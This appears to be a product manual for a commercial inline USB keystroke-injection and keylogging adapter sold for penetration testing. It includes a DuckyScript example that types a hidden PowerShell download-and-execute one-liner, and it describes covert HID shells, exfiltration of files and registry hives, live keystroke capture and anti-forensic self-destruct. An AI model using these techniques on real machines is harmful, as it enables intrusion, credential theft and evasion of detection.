---
title: "Hak5 O.MG Plug & Adapter Comprehensive Technical Manual"
model: "O.MG Plug"
manufacturer: "Hak5"
category: "Modular Inline Physical USB Attack & Keystroke Injection Adapter"
docs_url: "https://o.mg.lol/setup/OMGPlug/"
version: "3.0"
locale: "en"
---

# Hak5 O.MG Plug & Adapter Comprehensive Technical Manual

> The O.MG Plug (and O.MG Adapter) is a compact, modular inline penetration testing device containing the same full-featured microcontroller, 802.11 Wi-Fi radio, and DuckyScript keystroke injection engine as the O.MG Cable, engineered into a rugged adapter form factor.

---

## Table of Contents

- [**1. Product Overview & Hardware Architecture**](#1-product-overview--hardware-architecture)
  - [1.1 Introduction & Modular Form Factor Baseline](#11-introduction--modular-form-factor-baseline)
  - [1.2 Technical Specifications & Ground Truth Hardware Baseline](#12-technical-specifications--ground-truth-hardware-baseline)
  - [1.3 Inline Interception vs Unattended Dongle Deployment](#13-inline-interception-vs-unattended-dongle-deployment)
- [**2. Hardware Setup, Firmware Installation & Connectivity**](#2-hardware-setup-firmware-installation--connectivity)
  - [2.1 Activation using the O.MG Programmer](#21-activation-using-the-omg-programmer)
  - [2.2 Web Flasher & WebSerial Firmware Deployment](#22-web-flasher--webserial-firmware-deployment)
  - [2.3 Wi-Fi Management Access Point Setup](#23-wi-fi-management-access-point-setup)
  - [2.4 Web Dashboard Navigation & Network Configuration](#24-web-dashboard-navigation--network-configuration)
- [**3. Payload Authoring, DuckyScript & Execution Modes**](#3-payload-authoring-duckyscript--execution-modes)
  - [3.1 DuckyScript for O.MG Plug Core Directives](#31-duckyscript-for-omg-plug-core-directives)
  - [3.2 Payload Slots & Rapid Web UI Triggering](#32-payload-slots--rapid-web-ui-triggering)
  - [3.3 Inline USB Keyboard Keystroke Logging](#33-inline-usb-keyboard-keystroke-logging)
  - [3.4 International Keymaps & Layout Translation](#34-international-keymaps--layout-translation)
- [**4. HIDX StealthLink Covert Tunneling & Fleet Management**](#4-hidx-stealthlink-covert-tunneling--fleet-management)
  - [4.1 HIDX Covert Channel Architecture](#41-hidx-covert-channel-architecture)
  - [4.2 Cross-Platform Interactive Shell Execution](#42-cross-platform-interactive-shell-execution)
  - [4.3 Cloud C² Fleet Centralization](#43-cloud-c-fleet-centralization)
  - [4.4 WebSocket API Automation](#44-websocket-api-automation)
- [**5. Security Policies, Self-Destruct & Maintenance**](#5-security-policies-self-destruct--maintenance)
  - [5.1 Geofencing Boundary Protection](#51-geofencing-boundary-protection)
  - [5.2 Emergency Hardware Self-Destruct](#52-emergency-hardware-self-destruct)
  - [5.3 Troubleshooting, Diagnostic Calibration & Recovery](#53-troubleshooting-diagnostic-calibration--recovery)

---

## 1. Product Overview & Hardware Architecture

<!-- section: overview -->
This chapter details the hardware architecture, physical characteristics, and technical baseline of the Hak5 O.MG Plug and Adapter series.

### 1.1 Introduction & Modular Form Factor Baseline

The O.MG Plug delivers the full attack and diagnostic power of the O.MG platform in a modular adapter package. While the O.MG Cable permanently embeds the microcontroller inside an injection-molded charging cable, the O.MG Plug is packaged as an ultra-compact USB adapter (available in USB Type-A and Type-C plug configurations).

This modular architecture delivers distinct operational advantages:
- **Universal Cable Compatibility**: Operators can pair the O.MG Plug with any standard third-party USB cable, keyboard, mouse, or flash drive.
- **Interchangeable Form Factors**: Easily deployed between target hosts and enterprise peripherals, or deployed standalone as a covert unattended USB keystroke injector.
- **Ruggedized Construction**: Designed for repeated physical insertion and extraction during intensive field testing.

### 1.2 Technical Specifications & Ground Truth Hardware Baseline

The following truth table defines the technical specifications of the Hak5 O.MG Plug / Adapter:

| Hardware Component | Baseline Technical Parameter |
|---|---|
| **Architecture** | Modular Inline USB Attack Adapter / Keystroke Injection Plug |
| **Radio Transceiver** | Integrated 802.11b/g/n (2.4 GHz) Wi-Fi Transceiver with Micro-Antenna |
| **Operating Voltage** | 5V DC (+/- 0.5V) supplied via Host USB Connector |
| **Current Draw** | Idle: ~75 mA; Peak Wi-Fi Transmission: Up to 320 mA; Supply Min: 500 mA |
| **Data Passthrough** | Full USB 2.0 (480 Mbps) passthrough active when payload injection idle |
| **Power Passthrough** | 5V Fixed Voltage; USB-PD protocol negotiated to 5V maximum |
| **Form Factor Variants** | USB Type-A Inline Adapter, USB Type-C Modular Dongle |
| **Payload Storage** | Non-Volatile Flash Partition (Basic: 8 slots; Plus & Elite: Up to 200 slots) |
| **Keylogger Storage** | Keylogger Model: ~650,000 keystroke non-volatile FIFO buffer |
| **Hardware Compatibility** | Full Speed USB Keyboards (12 Mbps HID Protocol Compliant) |
| **Covert Communication** | HIDX StealthLink (Bi-directional interactive shell via HID reports) |
| **Safety & Defense** | WPA2 Wireless Security, BSSID Geofencing, Microcontroller Self-Destruct |

### 1.3 Inline Interception vs Unattended Dongle Deployment

The O.MG Plug supports two primary operational modalities:
1. **Inline Peripheral Interception Mode**:
   - The O.MG Plug is inserted into the host PC USB port.
   - An authorized peripheral (e.g., corporate keyboard, mouse, or barcode scanner) is connected into the female receptacle of the O.MG Plug.
   - When the user types, USB HID reports pass transparently through to the host. The O.MG Plug records keystrokes into its keylogger buffer and stands ready to inject malicious keystrokes over the wireless interface.
2. **Unattended Standalone Dongle Mode**:
   - The O.MG Plug is inserted into an exposed USB port on an unattended workstation, server, or kiosk with no peripheral attached.
   - The device immediately delivers pre-programmed DuckyScript payloads to achieve execution, spawn a reverse shell, or exfiltrate sensitive files.

---

## 2. Hardware Setup, Firmware Installation & Connectivity

<!-- section: configuration -->
This chapter details the activation, firmware installation, and network configuration procedures for the Hak5 O.MG Plug.

### 2.1 Activation using the O.MG Programmer

In compliance with telecommunications standards, the O.MG Plug is shipped deactivated. To activate and flash firmware:
1. Insert the male USB connector of the O.MG Plug into the female receptacle of the **O.MG Programmer**.
2. Connect the O.MG Programmer into your technician workstation.
3. Verify that the status LED illuminates on the programmer board.

### 2.2 Web Flasher & WebSerial Firmware Deployment

1. Launch Google Chrome, Brave, Chromium, or Microsoft Edge.
2. Navigate to: `https://o-mg.github.io/WebFlasher/`
3. Click **Connect** and select the O.MG Programmer COM / Serial port.
4. Select the target product: **O.MG Plug / Adapter**.
5. Select the latest firmware build and click **Flash Device**.
6. The browser will write the firmware partitions and verify flash memory integrity.

### 2.3 Wi-Fi Management Access Point Setup

Once flashing completes:
1. Unplug the O.MG Plug from the programmer and insert it into a target USB port or 5V power supply.
2. Scan for Wi-Fi networks on your smartphone or penetration testing laptop.
3. Connect to the default Access Point:
   - **SSID**: `O.MG`
   - **Passphrase**: `12345678`
4. Confirm your device receives an IP in the `192.168.4.0/24` subnet.
5. Direct your browser to: `http://192.168.4.1`

### 2.4 Web Dashboard Navigation & Network Configuration

The O.MG Plug Web UI provides access to all operational parameters:
- **Payload Slots Tab**: Author, upload, and test payloads.
- **Keylogger Tab**: Inspect live keyboard traffic, clear logs, and download text archives.
- **Settings Tab**:
  - Update AP SSID and WPA2 passphrase.
  - Enable Station Mode to join corporate Wi-Fi or mobile hotspots.
  - Configure Geofencing parameters and failsafe triggers.

---

## 3. Payload Authoring, DuckyScript & Execution Modes

<!-- section: features -->
This chapter covers payload development, DuckyScript syntax, keylogging, and international keyboard mapping for the O.MG Plug.

### 3.1 DuckyScript for O.MG Plug Core Directives

The O.MG Plug executes standard DuckyScript syntax with hardware-accelerated extensions:

```text
REM O.MG Plug Standalone Attack Example
DELAY 2000
GUI r
DELAY 300
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.4.1/script.ps1')"
ENTER
```

Key O.MG Directives:
- `DELAY <ms>`: Injects precision millisecond delays.
- `STRING <text>`: Injects typing strings.
- `USB_OVERCLOCK`: Enables enhanced USB transmission speeds.
- `WAIT_FOR_INPUT`: Pauses payload execution until an operator confirms via the Web UI.

### 3.2 Payload Slots & Rapid Web UI Triggering

The O.MG Plug allows up to 200 payloads to be pre-compiled into dedicated memory slots:
- Assign specific payloads to quick-trigger buttons in the Web UI.
- Trigger payloads remotely from up to 300 feet away via 802.11 Wi-Fi.

### 3.3 Inline USB Keyboard Keystroke Logging

When deployed inline with a target USB keyboard:
- All keystrokes are captured into an onboard non-volatile FIFO buffer (~650,000 keystrokes).
- The keylogger operates transparently with zero delay or latency perceptible to the user.
- Operators can stream live keystrokes in real time directly to their mobile browser.

### 3.4 International Keymaps & Layout Translation

- Access the built-in Keymap Viewer to select regional keyboard layouts (US, DE, FR, ES, IT, JP).
- Eliminates character misinterpretation across localized target operating systems.

---

## 4. HIDX StealthLink Covert Tunneling & Fleet Management

### 4.1 HIDX Covert Channel Architecture

HIDX StealthLink creates a physical bidirectional communication channel across standard USB HID reports. Because USB HID keyboards and mice are inherently permitted in restricted enterprise environments, StealthLink bypasses:
- Network port restrictions and proxy firewalls.
- USB mass storage endpoint blocks.
- Host-based firewall alerts.

### 4.2 Cross-Platform Interactive Shell Execution

Using injected PowerShell (Windows), Bash (Linux), or Python (macOS) one-liners, StealthLink establishes a full-duplex interactive terminal directly in the O.MG Plug Web UI:
- Execute system commands with host privileges.
- Exfiltrate documents and registry hives.
- Download additional penetration testing tooling into target memory.

### 4.3 Cloud C² Fleet Centralization

Configure the O.MG Plug in Station Mode to link with Hak5 Cloud C²:
- Manage fleets of deployed O.MG Plugs and Cables from a centralized dashboard.
- Monitor connection statuses, exfiltrate data, and dispatch scheduled attacks globally.

### 4.4 WebSocket API Automation

The embedded WebSocket server enables programmatic scripting:
```javascript
// Example WebSocket connection to O.MG Plug
const ws = new WebSocket('ws://192.168.4.1:80/ws');
ws.onmessage = function(event) {
    console.log("Logged Keystroke:", event.data);
};
```

---

## 5. Security Policies, Self-Destruct & Maintenance

<!-- section: maintenance -->
This chapter covers operational security, geofencing, hardware self-destruct, and diagnostic troubleshooting for the O.MG Plug.

### 5.1 Geofencing Boundary Protection

Prevent data leakage if the O.MG Plug is removed from the target facility:
- Configure target Wi-Fi BSSIDs.
- If the target BSSID is no longer detected, the O.MG Plug can automatically disable Wi-Fi broadcasting or trigger an emergency wipe.

### 5.2 Emergency Hardware Self-Destruct

When counter-surveillance or device seizure is detected:
- Execute `SELF_DESTRUCT` via the Web UI or a designated DuckyScript command.
- The onboard microcontroller erases flash sectors, corrupts configuration registers, and disables radio hardware, leaving zero forensic evidence.

### 5.3 Troubleshooting, Diagnostic Calibration & Recovery

#### Device Calibration Errors
If the O.MG Plug indicates calibration errors during boot:
1. Re-insert the device into the O.MG Programmer.
2. Run the official Calibration Resolution routine via the Python Flasher or Web Flasher.

#### Factory Reset
To restore factory default settings:
1. Attach the O.MG Plug to the O.MG Programmer.
2. Select **Erase Flash & Factory Reset** in the Web Flasher.
